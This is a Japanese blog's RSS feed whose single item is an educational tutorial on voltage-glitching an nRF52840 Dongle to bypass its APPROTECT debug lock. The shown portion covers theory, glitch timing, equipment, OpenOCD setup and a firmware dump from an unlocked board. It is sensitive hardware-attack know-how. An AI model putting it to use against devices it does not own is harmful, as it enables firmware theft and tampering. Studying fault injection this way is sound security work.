<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shooting!!!</title>
    <link>https://www.shutingrz.com/</link>
    <description>Recent content on Shooting!!!</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>ja-JP</language>
    <copyright>shutingrz - All rights reserved.</copyright>
    <lastBuildDate>Mon, 07 Mar 2022 03:00:00 +0900</lastBuildDate><atom:link href="https://www.shutingrz.com/index.xml" rel="self" type="application/rss+xml" />
    
    

    
    <item>
      <title>フォールトインジェクションとは？電圧グリッチでnRF52のプロテクションを破って学ぶ</title>
      <link>https://www.shutingrz.com/post/voltage-fault-injection-nrf52/</link>
      <pubDate>Mon, 07 Mar 2022 03:00:00 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/voltage-fault-injection-nrf52/</guid>
      <description>&lt;p&gt;しゅーと(&lt;a href=&#34;https://twitter.com/shutingrz&#34;&gt;@shutingrz&lt;/a&gt;)です。久しぶりの投稿です。&lt;/p&gt;
&lt;p&gt;皆さんはフォールトインジェクション(Fault Injection)という言葉を聞いたことがありますか？ハードウェアセキュリティ分野におけるフォールトインジェクションはサイドチャネル攻撃手法のひとつです。今までこの攻撃を試すには高価な機材が必要でハードルが高いものでした。しかし2020年に&lt;strong&gt;nRF52&lt;/strong&gt;という世界中で使われるマイコンにおいてフォールトインジェクションが可能な脆弱性が発見され、誰でも容易に検証ができるようになりました。nRF52は1000円ちょっとで入手でき、攻撃のために特殊な機材を必要としません。&lt;/p&gt;
&lt;p&gt;そこで皆さんにフォールトインジェクションという面白い攻撃手法を共有するために、攻撃成功までの道筋を教育資料として使えるように作成しました。頑張って書いたのでぜひ読んでください。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;※検証は自分自身が所有する機器に対してのみ行ってください。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;voltage-fault-injectionとは&#34;&gt;Voltage Fault Injectionとは&lt;/h1&gt;
&lt;p&gt;Voltage Fault Injectionとは、動作している機器の特定のタイミングでCPU電圧を変化させることで機器に誤動作（グリッチ）を引き起こさせる手法です。Voltage Glitch(電圧グリッチ)とも呼ばれます。フォールトインジェクションには今回行う電圧グリッチのほかにクロック、電磁などの非侵襲型、レーザー、ニードルなどの侵襲型があります。&lt;/p&gt;
&lt;p&gt;CPUがグリッチされると、命令がスキップされて本来到達し得ないコードに到達し実行される可能性があります。下記はif文の命令のタイミングで電圧グリッチを行った場合の処理の流れです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitch_flow.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;フォールトインジェクションが成功すると、ifの条件分岐をスキップして、条件を満たしていないのに&lt;code&gt;open_debug_port();&lt;/code&gt;が実行されます。そう、こんなミラクルが実際に起こってしまうのがフォールトインジェクションなのです。&lt;/p&gt;
&lt;p&gt;電圧グリッチにはグリッチャーと呼ばれる、特定タイミングで単一パルス(矩形波)を発生させる機器が必要です。パルスと言ってもグリッチャー単体でターゲットに攻撃するわけではなく、パルスは電圧を増減させるためのMOSFETなどの素子に送信されます。パルス電圧の特性にあまりこだわる必要はないので、一般的なFPGAやGPIOをもつマイコンでOKです。&lt;/p&gt;
&lt;p&gt;フォールトインジェクションの概要や理論をもっと詳しく知りたい方は、&lt;a href=&#34;#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE&#34;&gt;参考文献&lt;/a&gt;にある日本語資料を読むと良いでしょう。&lt;/p&gt;
&lt;h2 id=&#34;approtectバイパスとは&#34;&gt;APPROTECTバイパスとは&lt;/h2&gt;
&lt;p&gt;nRF52シリーズは、Nordic Semiconductor社が販売しているBLE機能を有するArm Cortex-Mマイコンです。その機能から世界中のIoT機器で幅広く使用されているのですが、2020年6月にセキュリティ上の問題が話題になりました。その問題とは、電圧グリッチによるAPPROTECTバイパスです。次のLimitedResultsのブログ記事によって詳細が明らかになりました(以降、&lt;strong&gt;参考記事&lt;/strong&gt;と呼びます)。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://limitedresults.com/2020/06/nrf52-debug-resurrection-approtect-bypass/&#34;&gt;nRF52 Debug Resurrection (APPROTECT Bypass) Part 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;APPROTECTとはアクセスポートプロテクションの略で、いわゆるオンチップデバッグ(On Chip Debug / OCD)のロック機能です。nRF52にはArm Cortex-Mが使われているので、デバッグインターフェースにはSWDが使われます。SWDは動作中の機器のデバッグを行えるほか、フラッシュ内のデータを取得することが可能です。昔の製品はファームウェアのデータはいくらでも取得できたのですが、知的財産の保護や、ファームウェア解析による攻撃の糸口を塞ぐという目的でプロテクションが行われるようになってきました。今回、このプロテクションが破られたのです。&lt;/p&gt;
&lt;p&gt;最近ではApple社の落とし物トラッカーであるAirTagがnRF52を使っていたため、これを用いてデバッグ機能が有効化され、ハッカーのおもちゃになりました。この件は日本でも話題になったので知っている方も多いと思います。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pc.watch.impress.co.jp/docs/news/1323993.html&#34;&gt;AirTagのハッキングに成功。知らないAirTagのスキャン時は注意&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;基板上の同コントローラはロックダウンされており、消去や書き込みは可能なものの、ファームウェアを読み出せなかったという。&lt;strong&gt;一方で同種のnRF52840コントローラでは、電圧変化によるフォールトインジェクションを利用してデバッグ機能を再度有効化できた例がすでに存在しており&lt;/strong&gt;、同氏はこの手法を活用してデバッグ機能を有効化し、ファームウェアの読み出しに成功した。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本記事での攻撃対象はAirTagではなくnRF52840のリファレンスボードであるnRF52840 Dongleに対するものですが、原理は全く一緒です。これをマスターすればAirTagに対しても成功させることは可能です。&lt;/p&gt;
&lt;h2 id=&#34;攻撃の脅威&#34;&gt;攻撃の脅威&lt;/h2&gt;
&lt;p&gt;攻撃者は攻撃対象機器でデバッグ機能が有効になっているかを高い優先度で調査します。デバッグ機能が有効だと、ファームウェアに含まれる秘密情報の窃取や、ファームウェアの抽出、脆弱性の効率的な調査を行うためのブレークポイント設置、ステップ実行ができるためです。逆にファームウェアが取得できず、デバッグができない場合、攻撃者は完全なブラックボックス調査をすることになります。そのためデバッグを強制的に有効にできるAPPROTECTバイパスは攻撃者にとって有益な攻撃手段なのです。&lt;/p&gt;
&lt;p&gt;nRF52はそもそもAPPROTECTが有効でも初期化を行うことでAPPROTECTを無効にできます。ただし同時にフラッシュ内のデータが消去されるので、ファームウェアが抽出できない状況では文鎮になります。逆にこの仕様を逆手にとることで、APPROTECTバイパスでデバッグを有効にしたあとにファームウェアを抽出し、初期化して抽出したファームウェアをフラッシュに書き込むことでデバッグ可能な機器に早変わりするのです。&lt;/p&gt;
&lt;h2 id=&#34;approtectバイパスの攻撃手法&#34;&gt;APPROTECTバイパスの攻撃手法&lt;/h2&gt;
&lt;p&gt;今回のAPPROTECTバイパスは電圧を加圧するのではなく、CPU電圧を一定時間GNDに落とすことで命令をスキップさせます。何度も書いていますが、攻撃で一番重要なのはタイミングです。&lt;/p&gt;
&lt;p&gt;nRF52ではメモリ領域にUICRと呼ばれるユーザが利用できるコンフィグ領域が存在します。UICRには色々なパラメータを保存されていますが、そこにはAPPROCTECTを有効にするフラグ領域もあります。下はnRF52840のデータシートに記載されているAPPROTECTレジスタの仕様です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/approtect.png&#34; alt=&#34;UICR_APPROTECT&#34;&gt;
&lt;/p&gt;
&lt;p&gt;起動時にメモリコントローラーがCPUコアにAPPROTECTのフラグを含むUICR情報を転送しますが、この転送するタイミングを見計らって電圧グリッチさせます。うまくいくと、&lt;strong&gt;UICRでAPPROTECTフラグ領域がオンなのにCPUのプロテクションがオフになっている&lt;/strong&gt;という奇妙な状態が発生します。&lt;/p&gt;
&lt;p&gt;今回は参考記事によってどのタイミングで転送が行われているかが明らかになっています。
下の波形画像は参考記事からの引用で、メモリコントローラーの転送タイミング付近です。電圧降下の直前、赤枠で囲った部分が電圧グリッチを行うべき箇所です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/Identification-1.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このタイミングでグリッチを行うことで、一定の確率でプロテクションをバイパス可能です。それではこの情報をもとに、ターゲットを入手して攻撃を試行します。&lt;/p&gt;
&lt;h1 id=&#34;検証環境&#34;&gt;検証環境&lt;/h1&gt;
&lt;p&gt;今回の電圧グリッチを行うためには、以下の物品が必要です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nRF52搭載のターゲット&lt;/li&gt;
&lt;li&gt;グリッチャーボード&lt;/li&gt;
&lt;li&gt;MOSFET&lt;/li&gt;
&lt;li&gt;デバッガ&lt;/li&gt;
&lt;li&gt;オシロスコープ&lt;/li&gt;
&lt;li&gt;はんだごてセット&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;nrf52搭載のターゲット&#34;&gt;nRF52搭載のターゲット&lt;/h3&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/nrf52840-page.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;まずは攻撃対象のnRF52シリーズを搭載しているデバイスの選定です。&lt;/p&gt;
&lt;p&gt;参考記事でのターゲットであるnRF52840-DKは高くて手が出せなかったので(1つ6000円)、検証には&lt;a href=&#34;https://www.nordicsemi.com/Products/Development-hardware/nrf52840-dongle&#34;&gt;nRF52840 Dongle&lt;/a&gt;を用いることにしました。Mouserで1180円です。&lt;/p&gt;
&lt;h3 id=&#34;グリッチャーボード&#34;&gt;グリッチャーボード&lt;/h3&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/esp32_devkitc.jpg&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;特定のタイミングでMOSFETにパルスを発生させるものです。&lt;/p&gt;
&lt;p&gt;グリッチはターゲットの特定処理をスキップさせるため、その特定処理を行っているタイミングをナノ秒〜マイクロ秒で合わせないといけません。このように非常に繊細な処理が必要とされるためグリッチャーにはしばしばFPGAが利用されますが、ターゲットへの攻撃タイミングがシビアではない場合は速度が遅い一般的なマイコン(STM32, Arduino等)を使っても問題ありません。&lt;/p&gt;
&lt;p&gt;今回は&lt;a href=&#34;https://akizukidenshi.com/catalog/g/gM-11819/&#34;&gt;ESP32-DevKitC&lt;/a&gt;を使いました。クロック周波数が240MHzとスペックが良いのに秋月で1480円なのでコスパ最強です。今回私が用意したファームウェアでグリッチを試したい方はこちらを利用してください。&lt;/p&gt;
&lt;h3 id=&#34;mosfet&#34;&gt;MOSFET&lt;/h3&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/xy-mos_struct.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;CPU電圧をGNDに落とすためのパーツです。MOSFET単体と抵抗を使って構成してもいいのですが、@jptomoya氏からXY-MOSというドライバーモジュールを教えてもらいました。Amazonで&lt;a href=&#34;https://amazon.co.jp/gp/product/B07BVKL4VW&#34;&gt;5個セット600円弱で購入できます&lt;/a&gt;し、AliExpressでも売っています。回路構成としてはMOSFETが並列で設置されており、Signalがゲート、GNDがソース、OUT-がドレインに接続されています。Signal、GNDは大きいスルーホールと小さいものがありますが、電気的につながっておりどちらの穴を使ってもかまいません。写真右の青いものはターミナルブロックで、ジャンパワイヤなどをグサっと刺せるようになっています。&lt;/p&gt;
&lt;h3 id=&#34;デバッガ&#34;&gt;デバッガ&lt;/h3&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/jlink_photo.jpg&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;nRF52にSWD接続するためのデバッガです。OpenOCDが対応している機材であればなんでも構いません。安いものだとFT232Hなどがあげられます。私は&lt;a href=&#34;https://www.embitek.co.jp/product/jlink-edu.html&#34;&gt;J-Link EDU&lt;/a&gt;を使いました（商用利用時などライセンスに注意）。&lt;/p&gt;
&lt;h3 id=&#34;オシロスコープ&#34;&gt;オシロスコープ&lt;/h3&gt;
&lt;p&gt;今回は5us程度の速度をキャプチャできれば良く精度が重要視されないので、トリガーが設定できるものなら何でもいいです。やってないので保証はできませんが、以下のスペックがあればいいと思っています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;10mV/div&lt;/li&gt;
&lt;li&gt;5us/div&lt;/li&gt;
&lt;li&gt;1ch&lt;/li&gt;
&lt;li&gt;トリガ機能(Rising)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;私はRigol DS1054Zを使っています。&lt;/p&gt;
&lt;h1 id=&#34;正常系の確認&#34;&gt;正常系の確認&lt;/h1&gt;
&lt;p&gt;本項目ではnRF52、SWDデバッグに慣れていない読者のために結線方法とデバッグ方法を説明しています。既に知っている方や、攻撃手法を早く知りたい方は飛ばしてください。&lt;/p&gt;
&lt;div class=&#34;accordion&#34;&gt;
  &lt;input id=&#34;id-735681924&#34; class=&#34;toggle&#34; type=&#34;checkbox&#34;&gt;
  &lt;label class=&#34;title&#34; for=&#34;id-735681924&#34;&gt;正常系の確認 &lt;span class=&#34;acc-desc&#34;&gt;（クリックで開閉）&lt;/span&gt;&lt;/label&gt;
  &lt;div class=&#34;content&#34;&gt;
&lt;p&gt;まずは購入したnRF52840 Dongleでサンプルプログラムを作成しましょう。DongleはUSB端子がついており、USB経由でファームウェアを書き込めます。コンパイルし書き込むために環境は自由ですが、私はVSCodeにPlatformIOの環境を構築しています。&lt;/p&gt;
&lt;p&gt;今回は次のコードを用いました。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;Arduino.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define LED_RED PIN_SERIAL_RX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;setup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hello, world!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;pinMode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LED_RED&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OUTPUT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;loop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;digitalWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LED_RED&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HIGH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;digitalWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LED_RED&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LOW&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;起動直後にシリアルに&amp;quot;hello, world!&amp;ldquo;を出力し、そのあと1秒ごとにLチカするコードです。書き込んだ後にLチカすることを確認します。&lt;/p&gt;
&lt;h2 id=&#34;swdを試す&#34;&gt;SWDを試す&lt;/h2&gt;
&lt;p&gt;はんだ付けが必要です。&lt;/p&gt;
&lt;p&gt;Dongleのデータシートを確認し、SWDIO、SWDCLK、GND、VDD OUT、VBUSをケーブルに接続します。次の画像は基板とはんだ付けポイントをマッピングした図です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/swd_pin.png&#34; alt=&#34;はんだ付け対象のピン&#34;&gt;
&lt;/p&gt;
&lt;p&gt;SWDIO、SWDCLKはランドが複数あります。USB端子側を使ってもいいですが、ここに結線するとUSB接続時に干渉する恐れがあります。そのため基板裏のSWDコネクタ用ランドを使うといいでしょう。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;VDD OUTの補足: VDD OUTは初期状態の回路では3.3Vの&lt;strong&gt;出力&lt;/strong&gt;として用いることになっています。しかし、Dongleでは電源入力にUSB電源であるVBUSの5V入力のほかに、VDD OUTを3.3Vの電源入力として使えます。後述するグリッチのためにVDD OUTを使うため、あわせて結線しておいてください。参考URLによれば、VDD OUTを3.3Vの電源入力として利用するときは基板裏のSB1をショートさせ、SB2のパターンをカットする必要があります。ただ実際試してみたところSB1、SB2を変更せずとも電源入力として使えました（自己責任でどうぞ）。&lt;/p&gt;
&lt;p&gt;参考: &lt;a href=&#34;https://infocenter.nordicsemi.com/index.jsp?topic=%2Fug_nrf52840_dongle%2FUG%2Fnrf52840_Dongle%2Fhw_power_ext_reg_source.html&#34;&gt;External regulated source&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;J-Linkに結線した場合はこんな感じになります。J-Linkは5Vを供給できるので、J-Linkの5V出力をVBUSに接続して駆動させています。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/nrf52_j-link.jpg&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;h2 id=&#34;openocdでのswdデバッグ&#34;&gt;OpenOCDでのSWDデバッグ&lt;/h2&gt;
&lt;p&gt;次に、OpenOCDでSWDを用いたデバッグをします。まずはOpenOCDのインストールから。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Ubuntu 20.04で用意されているaptパッケージのバージョンではnRF52840に対応していません&lt;/strong&gt;。他ディストリビューションのパッケージも古いようなので、Ubuntu以外を使っている人もGitHubにあるOpenOCDの最新ソースツリーからコンパイルして使ってください。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ sudo apt install libusb-1.0-0-dev make libtool pkg-config porg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ git clone https://github.com/openocd-org/openocd -b v0.11.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./bootstrap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./configure
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ make
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ sudo porg -lp &amp;#34;openocd-0.11.0&amp;#34; &amp;#34;make install&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ sudo cp /usr/local/share/openocd/contrib/60-openocd.rules /etc/udev/rules.d/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ sudo useradd -G plugdev $(whoami)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OpenOCDのインストール後、Dongleに電源を供給し、SWD接続します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ openocd -f interface/jlink.cfg -c &amp;#34;transport select swd&amp;#34; -f target/nrf52.cfg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Open On-Chip Debugger 0.11.0-dirty (2021-11-19-18:00)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Licensed under GNU GPL v2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;For bug reports, read
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	http://openocd.org/doc/doxygen/bugs.html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;swd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : Listening on port 6666 for tcl connections
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : Listening on port 4444 for telnet connections
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : J-Link V11 compiled Nov 16 2021 11:59:06
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : Hardware version: 11.00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : VTarget = 1.825 V
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : clock speed 1000 kHz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : SWD DPIDR 0x2ba01477
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : nrf52.cpu: hardware has 6 breakpoints, 4 watchpoints
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : starting gdb server for nrf52.cpu on 3333
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info : Listening on port 3333 for gdb connections
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ファームウェアダンプ&#34;&gt;ファームウェアダンプ&lt;/h3&gt;
&lt;p&gt;この時点でのDongleはAPPROTECT=デバッグロックがかかっていないため、ブレークポイントの設定、レジスタ操作、メモリ操作が可能です。これを利用して先ほど書き込んだサンプルプログラムのファームウェアをダンプしてみます。&lt;/p&gt;
&lt;p&gt;nRF52840のデータシートにはメモリマップが記載されています。メモリマップから、フラッシュ領域は0x0 ~ 0x00800000であることがわかります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/nrf52840_memory_map.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;OpenOCDのコンソールに接続し、当該領域をdump_imageコマンドでダンプします。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ telnet localhost 4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 127.0.0.1...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to localhost.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;^]&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Open On-Chip Debugger
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; halt; dump_image flashdump.bin 0x0 0x800000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dumped 8388608 bytes in 140.669281s (58.236 KiB/s)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ダンプしたファイルを確認すると、&lt;code&gt;hello, world&lt;/code&gt;という文字列も見つけられ、確かにダンプしたファームウェアであることがわかります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ hexdump -C flashdump.bin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000  00 00 01 20 f5 02 00 00  1d 03 00 00 1f 03 00 00  |... ............|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000010  21 03 00 00 23 03 00 00  25 03 00 00 00 00 00 00  |!...#...%.......|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000020  00 00 00 00 00 00 00 00  00 00 00 00 27 03 00 00  |............&amp;#39;...|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000030  29 03 00 00 00 00 00 00  2b 03 00 00 2d 03 00 00  |).......+...-...|
